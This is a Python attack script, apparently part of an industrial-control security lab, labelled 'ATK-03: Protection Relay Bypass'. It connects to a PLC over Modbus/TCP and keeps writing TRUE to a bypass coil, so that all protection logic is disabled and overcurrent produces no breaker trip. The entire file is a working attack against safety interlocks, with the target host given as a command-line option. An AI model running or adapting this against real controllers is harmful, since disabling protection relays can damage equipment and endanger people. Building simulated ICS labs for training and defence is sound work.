"""
attack_scripts/atk03_relay_bypass.py
─────────────────────────────────────────────────────────────
ATK-03: PROTECTION RELAY BYPASS

Writes TRUE to relay bypass coil (%MX0.1).
OpenPLC ladder logic checks this flag before running any
protection rungs — if TRUE, all protection is skipped.

This models a logic injection attack where attacker modifies
PLC internal memory flags to disable safety interlocks.
Educational Simulation Only.
"""

import time, sys, argparse
try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient

COIL_BYPASS = 4   # %MX0.1

def run_attack(host="127.0.0.1", port=502, duration=60):
    print("=" * 55)
    print("  ATK-03: RELAY BYPASS")
    print(f"  Target: %MX0.1 (relay_bypassed flag)")
    print("  Effect: All PLC protection logic disabled")
    print("  Educational simulation only.")
    print("=" * 55)

    client = ModbusTcpClient(host=host, port=port, timeout=3)
    if not client.connect():
        print(f"[!] Cannot connect to {host}:{port}"); sys.exit(1)

    print(f"\n[+] Connected — writing bypass flag TRUE to coil {COIL_BYPASS}")
    result = client.write_coil(COIL_BYPASS, True, slave=1)

    if result.isError():
        print(f"[!] Write failed: {result}")
        client.close(); sys.exit(1)

    print("[+] Relay bypass ACTIVE — protection logic DISABLED")
    print(f"[+] Holding bypass for {duration}s...")
    print("    Watch dashboard: current will climb past 100A — no trip\n")

    start = time.time()
    tick  = 0
    try:
        while time.time() - start < duration:
            tick += 1
            # Keep writing bypass in case PLC resets it
            client.write_coil(COIL_BYPASS, True, slave=1)

            coils = client.read_coils(0, count=5, slave=1)
            if not coils.isError():
                breaker = "CLOSED" if coils.bits[0] else "OPEN"
                alarm   = coils.bits[1]
                tripped = coils.bits[2]
                bypass  = coils.bits[4]
                print(f"[tick {tick:03d}] Breaker={breaker} | "
                      f"Alarm={alarm} | Tripped={tripped} | Bypass={bypass}")
            time.sleep(0.8)
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    finally:
        client.write_coil(COIL_BYPASS, False, slave=1)
        client.close()
        print("[+] Bypass flag cleared. Run reset to restore system.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host",     default="127.0.0.1")
    parser.add_argument("--port",     default=502, type=int)
    parser.add_argument("--duration", default=60,  type=int)
    args = parser.parse_args()
    run_attack(args.host, args.port, args.duration)
